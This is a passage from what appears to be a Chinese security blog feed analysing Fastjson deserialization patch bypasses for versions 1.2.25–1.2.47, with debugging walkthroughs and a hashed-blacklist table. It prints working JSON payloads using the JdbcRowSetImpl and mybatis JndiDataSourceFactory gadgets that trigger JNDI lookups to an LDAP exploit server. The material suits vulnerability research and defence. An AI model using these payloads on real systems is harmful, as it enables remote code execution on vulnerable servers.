== null</code>，但是第二部分JSON内容中的类已经通过第一部分解析的时候加载到Map中缓存了，因此该条件不成立从而成功绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p><p>运行会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p><p>1.2.48版本：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/10.png" alt=""></p><p>1.2.47版本：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/13.png" alt=""></p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/14.png" alt=""></p><p>导致目标类并不能缓存到Map中了：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/11.png" alt=""></p><p>因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/12.png" alt=""></p><hr><p>OK，19年的Fastjson反序列化漏洞就分析到这，后面是Fastjson系列的最后一篇了，说下检测与防御方法、高版本JDK绕过等等。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列三——历史版本补丁绕过（需开启AutoType）</title>
    <link href="https://www.mi1k7ea.com/2019/11/10/Fastjson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94%E2%80%94%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%EF%BC%88%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/</id>
    <published>2019-11-10T04:07:43.000Z</published>
    <updated>2019-11-10T15:33:00.174Z</updated>
    
    <content type="html"><![CDATA[<p>在1.2.24之后的版本中，使用了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。</p><p>网上一些文章讲的都是针对1.2.41、1.2.42、1.2.43、1.2.45这些特定版本的补丁绕过，其实实际上并不只是针对该特定版本，而是针对从1.2.25开始的一系列版本，自己试下就知道PoC可以打哪些范围了。</p><p>注意：<strong>本篇文章讲的历史补丁版本绕过的利用，都必须开启AutoTypeSupport才能成功</strong>。</p><h2 id="0x01-哈希黑名单"><a href="#0x01-哈希黑名单" class="headerlink" title="0x01 哈希黑名单"></a>0x01 哈希黑名单</h2><p>通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。</p><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p>目前已知的哈希黑名单的对应表如下：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr></tbody></table><p>目前未知的哈希黑名单：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>33238344207745342</td><td>0x761619136cc13eL</td><td></td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td></td></tr><tr><td>1.2.62</td><td>-5472097725414717105</td><td>0xb40f341c746ec94fL</td><td></td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td></td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td></td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td></td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td></tr></tbody></table><h2 id="0x02-1-2-25-1-2-41补丁绕过"><a href="#0x02-1-2-25-1-2-41补丁绕过" class="headerlink" title="0x02 1.2.25-1.2.41补丁绕过"></a>0x02 1.2.25-1.2.41补丁绕过</h2><h3 id="绕过利用"><a href="#绕过利用" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>本地fastjson用的是1.2.41版本。</p><p>这里Demo还是用的<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">《Fastjson系列二——1.2.22-1.2.24反序列化漏洞》</a>中基于JdbcRowSetImpl的利用链的PoC。</p><p>直接运行的话会报错，原因就是checkAutoType()函数中的黑名单过滤了”com.sun.”：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/1.png" alt=""></p><p>下面我们直接给出payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>关键PoC为：<code>Lcom.sun.rowset.JdbcRowSetImpl;</code></p><p>注意是要开启AutoTypeSupport的，添加以下代码就ok了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>直接运行即可绕过checkAutoType()黑名单实现弹计算器：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/2.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>我们注意到，PoC和之前的不同之处在于在”com.sun.rowset.JdbcRowSetImpl”类名的前面加了”L”、后面加了”;”就绕过了黑名单过滤。</p><p>下面我们调试分析看看为啥会绕过。</p><p>我们将断点打在checkAutoType()函数上，调试跟进去，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验，再往下开始调用TypeUtils.loadClass()：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/3.png" alt=""></p><p>跟进TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，也提示过了，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/4.png" alt=""></p><h2 id="0x03-1-2-25-1-2-42补丁绕过"><a href="#0x03-1-2-25-1-2-42补丁绕过" class="headerlink" title="0x03 1.2.25-1.2.42补丁绕过"></a>0x03 1.2.25-1.2.42补丁绕过</h2><h3 id="绕过利用-1"><a href="#绕过利用-1" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>先直接给出payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>关键PoC为：<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code></p><p>在1.2.22-1.2.42版本运行都能成功触发：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/5.png" alt=""></p><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">denyHashCodes = <span class="keyword">new</span> <span class="keyword">long</span>[]&#123;-<span class="number">8720046426850100497L</span>,-<span class="number">8109300701639721088L</span>,-<span class="number">7966123100503199569L</span>,-<span class="number">7766605818834748097L</span>,-<span class="number">6835437086156813536L</span>,-<span class="number">4837536971810737970L</span>,-<span class="number">4082057040235125754L</span>,-<span class="number">2364987994247679115L</span>,-<span class="number">1872417015366588117L</span>,-<span class="number">254670111376247151L</span>,-<span class="number">190281065685395680L</span>,<span class="number">33238344207745342L</span>,<span class="number">313864100207897507L</span>,<span class="number">1203232727967308606L</span>,<span class="number">1502845958873959152L</span>,<span class="number">3547627781654598988L</span>,<span class="number">3730752432285826863L</span>,<span class="number">3794316665763266033L</span>,<span class="number">4147696707147271408L</span>,<span class="number">5347909877633654828L</span>,<span class="number">5450448828334921485L</span>,<span class="number">5751393439502795295L</span>,<span class="number">5944107969236155580L</span>,<span class="number">6742705432718011780L</span>,<span class="number">7179336928365889465L</span>,<span class="number">7442624256860549330L</span>,<span class="number">8838294710098435315L</span>&#125;;</span><br></pre></td></tr></table></figure><p>在checkAutoType()函数中，通过调试发现这段代码会对”L”开头和”;”结尾的类名进行一次提取操作：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/6.png" alt=""></p><p>但由于只进行一次提取操作，因此可以通过添加两次的方式来绕过后面的黑名单校验。</p><p>后面的代码，是对提取出来的className即<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>进行denyList黑名单过滤，也就顺利绕过了。</p><p>注意下，在后面调用TypeUtils.loadClass()函数时，传入的是我们输入的<code>LLcom.sun.rowset.JdbcRowSetImpl;;</code>：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/7.png" alt=""></p><p>为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/8.png" alt=""></p><h2 id="0x04-1-2-25-1-2-43补丁绕过"><a href="#0x04-1-2-25-1-2-43补丁绕过" class="headerlink" title="0x04 1.2.25-1.2.43补丁绕过"></a>0x04 1.2.25-1.2.43补丁绕过</h2><h3 id="绕过利用-2"><a href="#绕过利用-2" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>直接给出payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"[com.sun.rowset.JdbcRowSetImpl"[&#123;,"dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true&#125;</span><br></pre></td></tr></table></figure><p>关键PoC：<code>[com.sun.rowset.JdbcRowSetImpl</code></p><p>但是如果我们一开始payload直接这样写是会报错的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>报错信息如下，显示期待在42列的位置接受个”[“符号，而42列正好是第一个逗号”,”前一个位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &apos;[&apos;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>因此改下payload，在第一个逗号前面加个”[“：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"[com.sun.rowset.JdbcRowSetImpl"</span>[,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>继续报错，显示期待在43列的位置接受个”{“符号，而43列正好是紧跟在新加的”[“字符的后一个位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos 43, fastjson-version 1.2.43</span><br></pre></td></tr></table></figure><p>因此就修改得到最终版payload，能够成功触发：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/9.png" alt=""></p><h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><p>调试发现，在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/10.png" alt=""></p><p>但是以”[“开头的类名自然能成功绕过上述校验以及黑名单过滤。</p><p>继续往下调试，在TypeUtils.loadClass()函数中，除了前面看到的判断是否以”L”开头、以”;”结尾的if判断语句外，在其前面还有一个判断是否以”[“开头的if判断语句，是的话就提取其中的类名，并调用Array.newInstance().getClass()来获取并返回类：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/11.png" alt=""></p><p>解析完返回的类名是”[com.sun.rowset.JdbcRowSetImpl”，通过checkAutoType()函数检测之后，到后面就是读该类进行反序列化了：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/12.png" alt=""></p><p>在反序列化中，调用了DefaultJSONParser.parseArray()函数来解析数组内容，其中会有一些if判断语句校验后面的字符内容是否为”[“、”{“等，前面一开始尝试的几个payload报错的原因正是出在这里：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/13.png" alt=""></p><p>把这些条件一一满足后，就能成功利用了。</p><h2 id="0x05-1-2-25-1-2-45补丁绕过"><a href="#0x05-1-2-25-1-2-45补丁绕过" class="headerlink" title="0x05 1.2.25-1.2.45补丁绕过"></a>0x05 1.2.25-1.2.45补丁绕过</h2><h3 id="绕过利用-3"><a href="#绕过利用-3" class="headerlink" title="绕过利用"></a>绕过利用</h3><p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p><p>直接给出payload，要连LDAP或RMI都可以：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="attr">"properties"</span>:&#123;<span class="attr">"data_source"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>关键PoC：<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p><p>主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.46的版本中可以看到：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr></tbody></table><p>运行即可成功触发：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/14.png" alt=""></p><h3 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h3><p>调试checkAutoType()函数，看到对前一个补丁绕过方法的”[“字符进行了过滤，只要类名以”[“开头就直接抛出异常：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/15.png" alt=""></p><p>后面由于”org.apache.ibatis.datasource.jndi.JndiDataSourceFactory”不在黑名单中，因此能成功绕过checkAutoType()函数的检测。</p><p>继续往下调试分析org.apache.ibatis.datasource.jndi.JndiDataSourceFactory这条利用链的原理。</p><p>由于payload中设置了properties属性值，且JndiDataSourceFactory.setProperties()方法满足之前说的Fastjson会自动调用的setter方法的条件，因此可被利用来进行Fastjson反序列化漏洞的利用。</p><p>直接在该setter方法打断点，可以看到会调用到这来，这里就是熟悉的JNDI注入漏洞了，即<code>InitialContext.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的：</p><p><img src="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/16.png" alt=""></p><p>之后就是由JNDI注入漏洞成功触发Fastjson反序列化漏洞了。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:10, Exploit</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:57, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:526, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:383, Class (java.lang)</span><br><span class="line">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:188, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:1086, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:544, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span 